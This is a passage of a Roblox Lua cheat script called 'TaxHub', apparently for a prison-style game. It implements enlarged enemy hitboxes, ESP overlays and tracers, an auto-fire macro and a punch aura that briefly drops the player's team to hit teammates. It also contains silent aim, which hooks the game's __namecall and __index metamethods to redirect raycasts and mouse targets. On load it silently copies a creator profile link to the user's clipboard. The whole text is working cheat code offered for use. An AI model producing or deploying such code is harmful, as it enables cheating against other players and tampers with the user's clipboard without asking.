            
            local ignoredHitbox = false
            if hitboxIgnore.Criminals and tName == "Criminals" then ignoredHitbox = true end
            if hitboxIgnore.Guards and tName == "Guards" then ignoredHitbox = true end
            if hitboxIgnore.Inmates and tName == "Inmates" then ignoredHitbox = true end
            
            local ignoredESP = false
            if espIgnore.Criminals and tName == "Criminals" then ignoredESP = true end
            if espIgnore.Guards and tName == "Guards" then ignoredESP = true end
            if espIgnore.Inmates and tName == "Inmates" then ignoredESP = true end
            
            -- Hitbox (Always respects teams)
            if hitboxEnabled and v.Team ~= lp.Team and not ignoredHitbox then
                head.Size=Vector3.new(hitboxSize,hitboxSize,hitboxSize); head.Transparency=hitboxTrans; head.CanCollide=false; head.Massless=true
            else head.Size=Vector3.new(2,1,1); head.Transparency=0; head.Massless=false end

            -- Chams (Adornments - No Highlight Limit)
            if chamsEnabled and not isT and not ignoredESP then
                local chamFolder = char:FindFirstChild("TaxChams")
                if not chamFolder then
                    chamFolder = Instance.new("Folder", char); chamFolder.Name = "TaxChams"
                    for _, part in pairs(char:GetChildren()) do
                        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" and part.Transparency ~= 1 then
                            local bha = Instance.new("BoxHandleAdornment", chamFolder)
                            bha.Name = "Cham_"..part.Name
                            bha.Adornee = part
                            bha.Size = part.Size
                            bha.AlwaysOnTop = true
                            bha.ZIndex = 5
                            bha.Transparency = 0.5
                            bha.Color3 = v.TeamColor.Color
                        end
                    end
                else
                    -- Update Color (Dynamic Team Change support)
                    for _, bha in pairs(chamFolder:GetChildren()) do
                        if bha:IsA("BoxHandleAdornment") then
                            bha.Color3 = v.TeamColor.Color
                            -- Refresh sizes if needed? Usually not for R6/R15 unless mesh changes
                            if bha.Adornee then bha.Size = bha.Adornee.Size end 
                        end
                    end
                end
            elseif char:FindFirstChild("TaxChams") then
                char.TaxChams:Destroy()
            end
            
            -- Boxes
            if boxesEnabled and not isT and not ignoredESP then
                local bg = char:FindFirstChild("TaxBox") or Instance.new("BillboardGui", char)
                bg.Name="TaxBox"; bg.Adornee=hrp; bg.Size=UDim2.new(4.5,0,6,0); bg.AlwaysOnTop=true
                local fr = bg:FindFirstChild("Frame") or Instance.new("Frame", bg)
                fr.Name="Frame"; fr.Size=UDim2.new(1,0,1,0); fr.BackgroundTransparency=1; fr.BorderSizePixel=0
                local stroke = fr:FindFirstChild("UIStroke") or Instance.new("UIStroke", fr)
                stroke.Color=v.TeamColor.Color; stroke.Thickness=2
            elseif char:FindFirstChild("TaxBox") then char.TaxBox:Destroy() end

            -- Names
            if namesEnabled and not isT and not ignoredESP then
                local ng = head:FindFirstChild("TaxName") or Instance.new("BillboardGui", head)
                ng.Name="TaxName"; ng.Size=UDim2.new(0,100,0,50); ng.StudsOffset=Vector3.new(0,2,0); ng.AlwaysOnTop=true
                local txt = ng:FindFirstChild("TextLabel") or Instance.new("TextLabel", ng)
                txt.BackgroundTransparency=1; txt.Size=UDim2.new(1,0,1,0); txt.Text=v.Name; txt.TextColor3=v.TeamColor.Color; txt.TextStrokeTransparency=0
            elseif head:FindFirstChild("TaxName") then head.TaxName:Destroy() end

            -- Tracers
            if tracersEnabled and not isT and not ignoredESP and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                local att1 = hrp:FindFirstChild("TaxTAtt") or Instance.new("Attachment", hrp); att1.Name="TaxTAtt"
                local att0 = lp.Character.HumanoidRootPart:FindFirstChild("TaxOAtt") or Instance.new("Attachment", lp.Character.HumanoidRootPart); att0.Name="TaxOAtt"
                local beam = lp.Character.HumanoidRootPart:FindFirstChild("TaxBeam_"..v.Name) or Instance.new("Beam", lp.Character.HumanoidRootPart)
                beam.Name="TaxBeam_"..v.Name; beam.Attachment0=att0; beam.Attachment1=att1; beam.Color=ColorSequence.new(v.TeamColor.Color); beam.Width0=0.1; beam.Width1=0.1; beam.FaceCamera=true
            else
                if hrp:FindFirstChild("TaxTAtt") then hrp.TaxTAtt:Destroy() end
                if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                    local b = lp.Character.HumanoidRootPart:FindFirstChild("TaxBeam_"..v.Name); if b then b:Destroy() end
                end
            end
        end
    end
end)

-- Macro Loop
task.spawn(function()
    while true do
        if macroEnabled and UIS:IsKeyDown(triggerKey) then
            local cnt = cam.ViewportSize/2
            VIM:SendKeyEvent(true, Enum.KeyCode.One, false, game); VIM:SendKeyEvent(false, Enum.KeyCode.One, false, game); task.wait(0.002)
            VIM:SendMouseButtonEvent(cnt.X, cnt.Y, 0, true, game, 1); VIM:SendMouseButtonEvent(cnt.X, cnt.Y, 0, false, game, 1); task.wait(0.002)
            VIM:SendKeyEvent(true, Enum.KeyCode.Two, false, game); VIM:SendKeyEvent(false, Enum.KeyCode.Two, false, game); task.wait(0.002)
            VIM:SendMouseButtonEvent(cnt.X, cnt.Y, 0, true, game, 1); VIM:SendMouseButtonEvent(cnt.X, cnt.Y, 0, false, game, 1); task.wait(0.002)
        else task.wait() end
    end
end)

-- Punch Aura Loop
task.spawn(function()
    local SavedTeam = nil
    while true do
        if punchAuraEnabled then
            pcall(function()
                for _,v in pairs(Players:GetPlayers()) do
                    if v~=lp and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                        if (lp.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude < 12 and v.Character.Humanoid.Health > 0 then
                            local isT = (v.Team == lp.Team)
                            if isT then
                                local ot = lp.Team
                                lp.Team = nil
                                ReplicatedStorage.meleeEvent:FireServer(v)
                                lp.Team = ot
                            else
                                ReplicatedStorage.meleeEvent:FireServer(v)
                            end
                        end
                    end
                end
            end)
        end
        task.wait()
    end
end)

--// ================================
--// SILENT AIM RENDER LOOP (EXACT COPY)
--// ================================
do
    local resume = coroutine.resume 
    local create = coroutine.create

    resume(create(function()
        RenderStepped:Connect(function()
            -- Target box
            if SilentAimSettings.ShowSilentAimTarget and SilentAimSettings.Enabled then
                if getClosestPlayerSilent() then 
                    local Root = getClosestPlayerSilent().Parent.PrimaryPart or getClosestPlayerSilent()
                    local RootToViewportPoint, IsOnScreen = WorldToViewportPoint(Camera, Root.Position)
                    
                    mouse_box.Visible = IsOnScreen
                    mouse_box.Position = Vector2.new(RootToViewportPoint.X - 10, RootToViewportPoint.Y - 10)
                else 
                    mouse_box.Visible = false 
                end
            else
                mouse_box.Visible = false
            end
            
            -- FOV Circle
            if SilentAimSettings.FOVVisible then 
                fov_circle.Visible = true
                fov_circle.Position = getMousePosition()
            else
                fov_circle.Visible = false
            end
        end)
    end))
end

--// ================================
--// SILENT AIM HOOKS (EXACT COPY)
--// ================================

-- Namecall Hook
do
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
        local Method = getnamecallmethod()
        local Arguments = {...}
        local self = Arguments[1]
        local chance = CalculateChance(SilentAimSettings.HitChance)
        

        
        if SilentAimSettings.Enabled and self == workspace and not checkcaller() and chance == true then
            if Method == "FindPartOnRayWithIgnoreList" and SilentAimSettings.SilentAimMethod == Method then
                if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithIgnoreList) then
                    local A_Ray = Arguments[2]

                    local HitPart = getClosestPlayerSilent()
                    if HitPart then
                        local Origin = A_Ray.Origin
                        local Direction = getDirection(Origin, HitPart.Position)
                        Arguments[2] = Ray.new(Origin, Direction)

                        return oldNamecall(unpack(Arguments))
                    end
                end
            elseif Method == "FindPartOnRayWithWhitelist" and SilentAimSettings.SilentAimMethod == Method then
                if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRayWithWhitelist) then
                    local A_Ray = Arguments[2]

                    local HitPart = getClosestPlayerSilent()
                    if HitPart then
                        local Origin = A_Ray.Origin
                        local Direction = getDirection(Origin, HitPart.Position)
                        Arguments[2] = Ray.new(Origin, Direction)

                        return oldNamecall(unpack(Arguments))
                    end
                end
            elseif (Method == "FindPartOnRay" or Method == "findPartOnRay") and SilentAimSettings.SilentAimMethod:lower() == Method:lower() then
                if ValidateArguments(Arguments, ExpectedArguments.FindPartOnRay) then
                    local A_Ray = Arguments[2]

                    local HitPart = getClosestPlayerSilent()
                    if HitPart then
                        local Origin = A_Ray.Origin
                        local Direction = getDirection(Origin, HitPart.Position)
                        Arguments[2] = Ray.new(Origin, Direction)

                        return oldNamecall(unpack(Arguments))
                    end
                end
            elseif Method == "Raycast" and SilentAimSettings.SilentAimMethod == Method then
                if ValidateArguments(Arguments, ExpectedArguments.Raycast) then
                    local A_Origin = Arguments[2]

                    local HitPart = getClosestPlayerSilent()
                    if HitPart then
                        Arguments[3] = getDirection(A_Origin, HitPart.Position)

                        return oldNamecall(unpack(Arguments))
                    end
                end
            end
        end
        return oldNamecall(...)
    end))
end

-- Index Hook
do
    local oldIndex = nil 
    oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, Index)
        if self == Mouse and not checkcaller() and SilentAimSettings.Enabled and SilentAimSettings.SilentAimMethod == "Mouse.Hit/Target" and getClosestPlayerSilent() then
            local HitPart = getClosestPlayerSilent()
            
            if Index == "Target" or Index == "target" then 
                return HitPart
            elseif Index == "Hit" or Index == "hit" then 
                return ((SilentAimSettings.MouseHitPrediction and (HitPart.CFrame + (HitPart.Velocity * PredictionAmount))) or (not SilentAimSettings.MouseHitPrediction and HitPart.CFrame))
            elseif Index == "X" or Index == "x" then 
                return self.X 
            elseif Index == "Y" or Index == "y" then 
                return self.Y 
            elseif Index == "UnitRay" then 
                return Ray.new(self.Origin, (self.Hit - self.Origin).Unit)
            end
        end

        return oldIndex(self, Index)
    end))
end

-- Safety Check
lp.CharacterAdded:Connect(function(c)
    if ghostActive then DisableGhost() end
    if spiderEnabled then DisableSpider() end -- Disable spider on death to reset gravity

    if staminaEnabled then
        task.wait(0.5)
        SetupStaminaCharacter(c)
    end
    if antiTazeEnabled then
        SetupAntiTaze(c)
    end
end)

--// --- NEW NOTIFICATION FEATURE --- //
task.spawn(function()
    if lp.PlayerGui:FindFirstChild("TaxHubNotification") then lp.PlayerGui.TaxHubNotification:Destroy() end
    
    -- Copy Link
    setclipboard("https://www.roblox.com/users/1226112535/profile")
    
    -- GUI
    local notifGui = Instance.new("ScreenGui", lp.PlayerGui)
    notifGui.Name = "TaxHubNotification"
    
    local frame = Instance.new("Frame", notifGui)
    frame.Size = UDim2.new(0, 320, 0, 100)
    frame.Position = UDim2.new(1, -330, 1, -110) -- Bottom Right
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(0, 255, 100)
    stroke.Thickness = 2
    
    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundTransparency = 1
    title.Text = "FOLLOW CREATOR"
    title.TextColor3 = Color3.fromRGB(0, 255, 100)
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 14
    
    local desc = Instance.new("TextLabel", frame)
    desc.Size = UDim2.new(0.9, 0, 0.4, 0)
    desc.Position = UDim2.new(0.05, 0, 0.35, 0)
    desc.BackgroundTransparency = 1
    desc.Text = "Please follow this account to support the script!\nLink copied to clipboard."
    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
    desc.Font = Enum.Font.GothamBold
    desc.TextSize = 12
    desc.TextWrapped = true
    
    local bar = Instance.new("Frame", frame)
    bar.Size = UDim2.new(1, 0, 0, 4)
    bar.Position = UDim2.new(0, 0, 1, -4)
    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    bar.BorderSizePixel = 0
    
    -- Animation
    TweenService:Create(bar, TweenInfo.new(10), {Size = UDim2.new(0, 0, 0, 4)}):Play()
    
    task.wait(10)
    notifGui:Destroy()
end)

end -- End of StartTaxHub

--// --- EXECUTE --- //
--// --- EXECUTE --- //
CreateDevLog(StartTaxHub)
